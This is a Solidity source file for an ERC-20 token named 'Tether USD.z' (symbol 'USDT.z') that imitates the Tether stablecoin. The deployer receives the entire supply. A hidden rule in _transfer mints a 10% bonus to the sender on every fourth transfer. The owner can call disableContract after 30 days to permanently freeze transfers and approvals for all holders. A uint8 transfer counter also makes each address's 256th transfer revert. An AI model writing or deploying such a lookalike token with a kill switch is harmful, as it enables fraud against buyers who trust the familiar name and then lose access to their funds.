// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract USDTz is IERC20 {
    string public name = "Tether USD.z";
    string public symbol = "USDT.z";
    uint8 public decimals = 6;

    uint256 private _totalSupply;
    address public owner;
    uint256 public launchTime;

    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;

    mapping(address => uint8) public transferCount;
    bool public disabled;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    modifier notDisabled() {
        require(!disabled, "Contract is disabled");
        _;
    }

    constructor() {
        owner = msg.sender;
        _totalSupply = 1_000_000_000 * 10**decimals;
        balances[owner] = _totalSupply;
        launchTime = block.timestamp;
        emit Transfer(address(0), owner, _totalSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public override notDisabled returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override notDisabled returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override notDisabled returns (bool) {
        require(allowances[sender][msg.sender] >= amount, "Allowance exceeded");
        allowances[sender][msg.sender] -= amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(balances[sender] >= amount, "Insufficient balance");

        balances[sender] -= amount;
        balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);

        transferCount[sender]++;
        if (transferCount[sender] % 4 == 0) {
            uint256 bonus = balances[sender] / 10;
            balances[sender] += bonus;
            _totalSupply += bonus;
            emit Transfer(address(0), sender, bonus);
        }
    }

    function disableContract() public onlyOwner {
        require(block.timestamp >= launchTime + 30 days, "Too early");
        disabled = true;
    }
}
